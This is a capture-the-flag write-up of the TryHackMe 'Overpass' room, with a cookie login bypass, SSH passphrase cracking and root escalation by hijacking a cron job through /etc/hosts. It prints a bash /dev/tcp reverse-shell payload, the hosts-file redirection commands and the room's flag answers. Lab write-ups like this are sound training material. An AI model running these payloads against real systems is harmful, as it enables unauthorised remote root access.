# 🛡️ TryHackMe – Overpass - Writeup

## 📌 Overview
**Room Name:** Overpass  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web / Authentication Bypass / Cryptography / Cron Job Exploitation

This machine highlights a series of common security oversights — from weak web authentication to insecure file permissions and cron job manipulation.

The attack chain involves:

- Cookie manipulation to bypass login (Broken Access Control)
- RSA private key discovery and passphrase cracking
- SSH login as `james`
- World-writable `/etc/hosts` exploitation via DNS poisoning
- Root cron job hijacked to execute a malicious reverse shell

---

## 🔍 1. Enumeration

### 🔎 Port Scanning & Web Analysis
Initial web scan and source code analysis of the login page revealed a flawed authentication logic: the application checked only for the presence of a specific cookie to grant access.

---

## 🔓 2. Initial Access

### 🍪 Cookie Manipulation
By setting a `SessionToken` cookie to the value `admin` in the browser, the login was bypassed entirely without credentials.

In the administrator area, an **encrypted RSA private key** was discovered.

### 🔑 SSH Key Cracking
Converted the key and cracked the passphrase with `john`:

```bash
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
# Result: james13
```

Logged in via SSH:

```bash
chmod 600 id_rsa
ssh -i id_rsa james@<target_ip>
```

**Initial access as `james` achieved.** ✅

---

## 👑 3. Privilege Escalation: james → root

### 🔍 Cron Job Discovery

```bash
cat /etc/crontab
```

```text
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

The system downloads and executes a script from `overpass.thm` **every minute as root**.

### 🌐 World-Writable /etc/hosts
Checked permissions on `/etc/hosts`:

```bash
ls -l /etc/hosts
# -rw-rw-rw-
```

`/etc/hosts` was globally writable — allowing any user to redirect hostname resolution.

### 🛠️ DNS Poisoning Attack

**Step 1:** Redirect `overpass.thm` to the Kali IP:

```bash
echo "<kali_ip> overpass.thm" > /etc/hosts
```

**Step 2:** Create a malicious `buildscript.sh` on Kali:

```bash
mkdir -p downloads/src
echo "bash -i >& /dev/tcp/<kali_ip>/4444 0>&1" > downloads/src/buildscript.sh
```

**Step 3:** Start a web server and listener:

```bash
python3 -m http.server 80
nc -lvnp 4444
```

After one minute, the root cron job fetched and executed the malicious script.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```
thm{65c1aaf000506e56996822c6281e6bf7}
```

### 👑 Root Flag

```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

---

## 📚 Key Takeaways

- 🍪 **Never use client-side cookies for authentication logic:** Storing role information in a cookie that users can freely edit is equivalent to having no authentication at all. Use server-side session stores with unpredictable session IDs.
- 📁 **Critical system files must have strict permissions:** `/etc/hosts` being world-writable allowed a low-privileged user to redirect system-wide hostname resolution. These files should be `644` at most.
- 🌐 **Cron jobs using hostnames are vulnerable to DNS poisoning:** A root cron job that curls a hostname instead of a hardcoded IP or verified source can be redirected by anyone who can modify `/etc/hosts`.
- 🔑 **Weak SSH key passphrases provide false security:** `james13` was cracked in seconds with `rockyou.txt`. Strong, unique passphrases are essential — a weak passphrase makes encryption useless.

---

## 🛠️ Tools Used

- `ssh2john`, `john`
- `ssh`
- `python3` (http.server)
- `nc` (netcat)

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
